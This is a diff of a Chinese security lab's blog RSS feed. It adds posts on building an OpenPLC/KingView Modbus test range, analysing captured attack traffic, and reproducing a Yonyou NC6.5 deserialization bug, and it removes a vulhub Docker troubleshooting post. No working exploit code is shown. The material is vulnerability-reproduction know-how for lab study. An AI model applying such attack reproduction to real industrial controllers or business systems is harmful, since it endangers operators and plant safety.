@@ -6,9 +6,181 @@
     <description>哨兵安全实验室</description>
     <link>https://www.sentrylab.cn/</link>
     <atom:link href="https://sentrylab.cn/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Thu, 15 Apr 2021 00:41:22 +0800</pubDate>
-    <lastBuildDate>Thu, 15 Apr 2021 00:41:22 +0800</lastBuildDate>
+    <pubDate>Fri, 07 May 2021 20:35:32 +0800</pubDate>
+    <lastBuildDate>Fri, 07 May 2021 20:35:32 +0800</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>blog: 《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》</title>
+        <description>&lt;h4 id=&quot;-wireshark流量分析&quot;&gt;# &lt;em&gt;WireShark&lt;/em&gt;流量分析&lt;/h4&gt;
+
+&lt;p&gt;网上已经有大佬上传wireshark流量文件，就不重复造轮子去流量了，直接下载下来对照poc代码分析看看：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/sxd0216/attack-packets&quot;&gt;点击下载：&lt;em&gt;sxd0216/attack-packets&lt;/em&gt;&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;14、16帧为client向server请求流量，具体如下图：&lt;/li&gt;
+      &lt;li&gt;15、17帧为server返回给client确认流量，具体流量可自行下载分析&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/wireshark_tcp_show.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;-模拟攻击启停&quot;&gt;# 模拟攻击启停&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/OpenPLC_attack_success.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 07 May 2021 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/</link>
+        <guid isPermaLink="true">/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>漏洞复现</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 《基于Modbus协议与KingView实现Openplc仿真通讯（1）- 仿真通讯靶场搭建》</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;基于Modbus协议与KingView实现Openplc仿真通讯 - 通讯靶场网络示意图如下&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021//assets-network-show.png&quot; alt=&quot;assets-network-show.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;-openplc-on-linux&quot;&gt;# &lt;em&gt;OpenPLC on Linux&lt;/em&gt;&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;OpenPLC&lt;/em&gt;环境搭建
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;https://github.com/thiagoralves/OpenPLC_v3&quot;&gt;&lt;em&gt;点击以了解OpenPLC&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mkdir ICWR &amp;amp;&amp;amp; cd ICWR
+$ git clone https://github.com/thiagoralves/OpenPLC_v3.git
+$ cd OpenPLC_v3
+$ ./install.sh linux
+···
+···
+···
+Compiling for Linux
+Generating object files...
+Generating glueVars...
+Compiling main program...
+Compilation finished successfully!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;运行：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nohup ./start_openplc.sh &amp;amp;&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;OpenPLC_Editor on Linux&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;作用为本地PLC程序调试使用，无需求可跳过&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://github.com/thiagoralves/OpenPLC_Editor.git
+$ cd OpenPLC_Editor
+$ ./install.sh
+$ ./openplc_editor.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;-openplc-programs&quot;&gt;# &lt;em&gt;OpenPLC Programs&lt;/em&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -o openplc_test.st https://raw.githubusercontent.com/sxd0216/openplc_test.st/master/openplc_test.st
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/OpenPLC_TODO1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;-kingview-on-windows&quot;&gt;# &lt;em&gt;Kingview on Windows&lt;/em&gt;&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;设备驱动 -&amp;gt; PLC -&amp;gt; 莫迪康 -&amp;gt; ModBUS TCP -&amp;gt; TCP -&amp;gt; 下一步：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_TODO.png&quot; alt=&quot;KingView_OPENPLC_TODO&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;文件 -&amp;gt; 画面 添加组件（可参考动图添加组件）&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;数据库 -&amp;gt; 数据字典 -&amp;gt; 新建…&lt;/p&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_TODO2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;选中自定义画面 -&amp;gt; make -&amp;gt; view （GIF动画有点大，loading…）：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_success.gif&quot; alt=&quot;success.gif&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 07 May 2021 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/</link>
+        <guid isPermaLink="true">/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>漏洞复现</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: [UPDATING...]用友NC6.5java反序列化</title>
+        <description>&lt;h2 id=&quot;零用友nc65反序列化依赖jar包&quot;&gt;零：用友nc6.5反序列化依赖jar包&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;部分依赖jar包在安装完nc6.5系统后，一般在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C://yonyou//home//lib//&lt;/code&gt;目录下，前提需要有nc6.5的安装包；或者下载仓库内的依赖包：
+    &lt;ul&gt;
+      &lt;li&gt;&lt;em&gt;&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/tree/yonyou-ncv6.5/yonyou-nc6.5-lib/README.MD&quot;&gt;点击以了解yonyou-nc6.5-lib&lt;/a&gt;&lt;/em&gt;
+        &lt;ul&gt;
+          &lt;li&gt;本机运行环境
+  ```
+  java version “1.8.0_181”
+  Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
+  Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;p&gt;javac 1.8.0_181
+  ```&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;学习教程&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/README.MD&quot;&gt;&lt;em&gt;README&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;0x01下载&quot;&gt;0x01：下载&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;单jar包：点击&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/ncdepend.jar&quot;&gt;&lt;em&gt;ncdepend.jar&lt;/em&gt;&lt;/a&gt;链接 -&amp;gt; Download.&lt;/li&gt;
+  &lt;li&gt;整包&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/releases/tag/yonyou-ncv6.5&quot;&gt;&lt;em&gt;yonyou-NCv6.5-lib.zip&lt;/em&gt;&lt;/a&gt;链接 -&amp;gt; 单击链接下载&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[anonymous] DEBUG  - Invoke nc.bs.framework.server.RemoteMetaContext.lookup write info to server spend time: 188 
+Exception in thread &quot;main&quot; nc.bs.framework.exception.FrameworkIOException: Remote request error
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2021/yonyou-nc6.5-java-underser/</link>
+        <guid isPermaLink="true">/blog/2021/yonyou-nc6.5-java-underser/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>笔记</category>
+        
+      </item>
     
       <item>
         <title>blog: CST 2021年 4月14日 星期三：一次朔源事件的记录</title>
@@ -92,7 +264,7 @@ $ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv|wc -l
 &lt;h4 id=&quot;-1x02something-interesting&quot;&gt;# 1x02：Something Interesting&lt;/h4&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;点击以了解 &lt;a href=&quot;https://fofa.so/&quot; target=&quot;_blank&quot;&gt;fofa安全工程师们&lt;/a&gt;与&lt;a href=&quot;https://x.threatbook.cn/&quot; target=&quot;_blank&quot;&gt;微步安全工程师们&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;点击以了解 &lt;a href=&quot;https://fofa.so/&quot; target=&quot;_blank&quot;&gt;fofa安全工程师们&lt;/a&gt; 与 &lt;a href=&quot;https://x.threatbook.cn/&quot; target=&quot;_blank&quot;&gt;微步安全工程师们&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;&lt;img align=&quot;left&quot; src=&quot;https://x.threatbook.cn/public/img/logo-in-header.882f692c.png&quot; height=&quot;30%&quot; width=&quot;50%&quot; /&gt;
@@ -2095,452 +2267,6 @@ Content-Type: application/json
         <category>信息搜集</category>
         
         <category>笔记</category>
-        
-      </item>
-    
-      <item>
-        <title>blog: 「排错」：Docker启动vulnhub报错排错</title>
-        <description>&lt;p&gt;最近在做靶场漏洞复现的时候发现了一个由web虚拟机和db虚拟机一起跑起来的联动靶场环境，下载完镜像后总是报错，思前想后都没办法，于是只能自己来解决问题，虽然结果令人大失所望，但是过程还是挺让人有成就感的，就记录了一下。&lt;/p&gt;
-
-&lt;h2 id=&quot;docker启服务&quot;&gt;#docker启服务&lt;/h2&gt;
-&lt;p&gt;进入相对应的靶场环境文件夹下起靶场：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % docker-compose up -d
-Creating network &quot;cve-2020-9402_default&quot; with the default driver
-Creating cve-2020-9402_db_1 ... done
-Creating cve-2020-9402_web_1 ... done
-bin4xin@bin4xin'&lt;/span&gt;s MacbookPro CVE-2020-9402 % docker-compose ps
-       Name                      Command               State              Ports            
-&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------&lt;/span&gt;
-cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
-cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&amp;gt;8000/tcp 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;我们可以看到对应web服务的端口监听状态：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0:8000-&amp;gt;8000/tcp&lt;/code&gt;，所以我们直接访问试试看：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % curl localhost:8000
-curl: (52) Empty reply from server
-bin4xin@bin4xin'&lt;/span&gt;s MacbookPro CVE-2020-9402 % docker-compose ps  
-       Name                      Command               State              Ports            
-&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------&lt;/span&gt;
-cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
-cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&amp;gt;8000/tcp 
-
-
-bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % curl 127.0.0.1:8000/vuln
-curl: (52) Empty reply from server
-bin4xin@bin4xin'&lt;/span&gt;s MacbookPro CVE-2020-9402 % docker-compose ps       
-       Name                      Command               State              Ports            
-&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------&lt;/span&gt;
-cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
-cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&amp;gt;8000/tcp 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;在上面的bash终端代码我们可以看到，我们访问8000端口服务，都是返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Empty reply from server&lt;/code&gt;，我就很郁闷了，明明docker显示状态是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Up&lt;/code&gt;状态，怎么访问时服务返回空呢。&lt;/p&gt;
-
-&lt;h2 id=&quot;排错&quot;&gt;#排错&lt;/h2&gt;
-
-&lt;h3 id=&quot;这是一个有脾气的容器&quot;&gt;#这是一个有脾气的容器&lt;/h3&gt;
-&lt;p&gt;还是不甘心，看了一下本地的ip地址，再次访问看看：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro shiro % ifconfig|grep inet                                                  
-	inet 127.0.0.1 netmask 0xff000000 
-	inet6 ::1 prefixlen 128 
-	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 
-	inet6 fe80::aede:48ff:fe00:1122%en5 prefixlen 64 scopeid 0x7 
-	inet6 fe80::146d:ed67:817a:e134%en0 prefixlen 64 secured scopeid 0x9 
-	inet 114.97.221.67 netmask 0xfffffe00 broadcast 114.97.221.255
-	inet6 fe80::24e6:3dff:fe1c:7c55%awdl0 prefixlen 64 scopeid 0x10 
-	inet6 fe80::24e6:3dff:fe1c:7c55%llw0 prefixlen 64 scopeid 0x11 
-	inet6 fe80::9a9a:9906:8f8d:5e0%utun0 prefixlen 64 scopeid 0x12 
-	inet6 fe80::8ef2:d44b:f2b0:f37e%utun1 prefixlen 64 scopeid 0x13 
-
-en0: flags=8863&amp;lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&amp;gt; mtu 1500
-	inet 114.97.221.67
-
-bin4xin@bin4xin'&lt;/span&gt;s MacbookPro shiro % curl http://114.97.221.67:8000/vuln
-curl: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Failed to connect to 114.97.221.67 port 8000: Connection refused
-
-bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro shiro % docker-compose ps                  
-       Name                      Command                 State                 Ports            
-------------------------------------------------------------------------------------------------
-cve-2020-9402_db_1    /entrypoint.sh                   Up           1521/tcp, 5500/tcp, 8080/tcp
-cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Restarting 
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;好家伙，这次直接web服务重启了，有脾气。没办法，直接把整个环境down掉重启。&lt;/p&gt;
-
-&lt;h3 id=&quot;进容器&quot;&gt;#进容器&lt;/h3&gt;
-&lt;p&gt;这次我想到的办法是直接进容器里面去看看服务到底发生了什么：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker ps
-
-a66976bc6d2b        cve-2020-9402_web      &lt;span class=&quot;s2&quot;&gt;&quot;/docker-entrypoint.…&quot;&lt;/span&gt;   4 seconds ago       Up 3 seconds        0.0.0.0:8000-&amp;gt;8000/tcp         cve-2020-9402_web_1
-fc99758ce428        vulhub/oracle:12c-ee   &lt;span class=&quot;s2&quot;&gt;&quot;/entrypoint.sh&quot;&lt;/span&gt;         5 seconds ago       Up 3 seconds        1521/tcp, 5500/tcp, 8080/tcp   cve-2020-9402_db_1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;我们可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt;来查看docker镜像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cve-2020-9402_web&lt;/code&gt;对应的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONTAINER ID&lt;/code&gt;，通过这个id值进入容器；&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % sudo docker exec -it a66976bc6d2b /bin/bash
-root@a66976bc6d2b:/usr/src# 
-root@a66976bc6d2b:/usr/src# ps -ef
-UID        PID  PPID  C STIME TTY          TIME CMD
-root         1     0  0 06:44 ?        00:00:00 /bin/bash /docker-entrypoint.sh python manage.py runserver 0.0.0.0:8000
-root         7     1  0 06:44 ?        00:00:00 bash /usr/local/bin/wait-for-it.sh -t 0 db:1521 -- echo oracle is up
-root        56     0  0 06:45 pts/0    00:00:00 /bin/bash
-root        73     7  0 06:45 ?        00:00:00 sleep 1
-root        74    56  0 06:45 pts/0    00:00:00 ps -ef
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;看了一下，没什么大问题啊，服务该照常启动的都启动了，难道是db服务的问题？就在我疑惑的时候，果然：容器又重启了，我的shell直接掉了，查看一下状态，可不咋地，又restart了，心里苦阿。&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % docker ps
-
-CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS                         PORTS                          NAMES
-a66976bc6d2b        cve-2020-9402_web      &quot;/docker-entrypoint.…&quot;   2 minutes ago       Restarting (1) 2 seconds ago
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;日志排错-&quot;&gt;#日志排错:-)&lt;/h2&gt;
-&lt;p&gt;排错之前看一下docker的打印日志指南&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;% docker logs &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
-
-Usage:  docker logs &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONS] CONTAINER
-
-Fetch the logs of a container
-
-Options:
-      &lt;span class=&quot;nt&quot;&gt;--details&lt;/span&gt;        Show extra details provided to logs
-  &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--follow&lt;/span&gt;         Follow log output
-      &lt;span class=&quot;nt&quot;&gt;--since&lt;/span&gt; string   Show logs since timestamp &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 2013-01-02T13:23:37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or relative &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 42m &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;42 minutes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;--tail&lt;/span&gt; string    Number of lines to show from the end of the logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default &lt;span class=&quot;s2&quot;&gt;&quot;all&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--timestamps&lt;/span&gt;     Show timestamps
-      &lt;span class=&quot;nt&quot;&gt;--until&lt;/span&gt; string   Show logs before a timestamp &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 2013-01-02T13:23:37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or relative &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 42m &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;42 minutes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;我们可以看到，f参数对应的是log查看的容器id，而我的需求是，对应查看某一个时间段之后的db虚拟机的日志，所以生成命令：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker logs --since 2020-09-11T14:50:00  -f b5731d06d3ea&lt;/code&gt;
-web的日志:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro shiro % docker logs --since 2020-09-11T14:40:00  -f ae715c332e7e
-+ cd /usr/src
-+ wait-for-it.sh -t 0 db:1521 -- echo '&lt;/span&gt;oracle is up&lt;span class=&quot;s1&quot;&gt;'
-wait-for-it.sh: waiting for db:1521 without a timeout
-wait-for-it.sh: db:1521 is available after 60 seconds
-oracle is up
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;我们可以看到没有任何报错；继续，看下面的报错：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+ python manage.py makemigrations
-Traceback &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;most recent call last&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py&quot;&lt;/span&gt;, line 220, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ensure_connection
-    self.connect&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py&quot;&lt;/span&gt;, line 26, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;inner
-    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;func&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;args, &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;kwargs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py&quot;&lt;/span&gt;, line 197, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;connect
-    self.connection &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; self.get_new_connection&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn_params&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py&quot;&lt;/span&gt;, line 26, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;inner
-    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;func&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;args, &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;kwargs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-  File &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/lib/python3.6/site-packages/django/db/backends/oracle/base.py&quot;&lt;/span&gt;, line 232, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;get_new_connection
-    &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;conn_params,
-cx_Oracle.DatabaseError: ORA-12505: TNS:listener does not currently know of SID given &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;connect descriptor
-
-
-The above exception was the direct cause of the following exception:
-
-Traceback &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;most recent call last&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-  File &lt;span class=&quot;s2&quot;&gt;&quot;manage.py&quot;&lt;/span&gt;, line 21, &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;
-    main&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-·中间部分省略
-·中间部分省略
-·中间部分省略
-    &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;conn_params,
-django.db.utils.DatabaseError: ORA-12505: TNS:listener does not currently know of SID given &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;connect descriptor
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;查看报错是db的报错，赶紧看看db虚拟机的日志情况&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker logs --since 2020-09-11T14:40:00  -f b32b16e34b6c&lt;/code&gt;
-db：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access /u01/app/oracle/oradata/orcl: No such file or directory
-No databases found &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /u01/app/oracle/oradata/orcl. About to create a new database instance
-Starting database listener
-
-LSNRCTL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 12.1.0.2.0 - Production on 11-SEP-2020 06:54:05
-
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1991, 2014, Oracle.  All rights reserved.
-
-Starting /u01/app/oracle/product/12.1.0.2/dbhome_1/bin/tnslsnr: please wait...
-
-TNSLSNR &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 12.1.0.2.0 - Production
-System parameter file is /u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.ora
-Log messages written to /u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xml
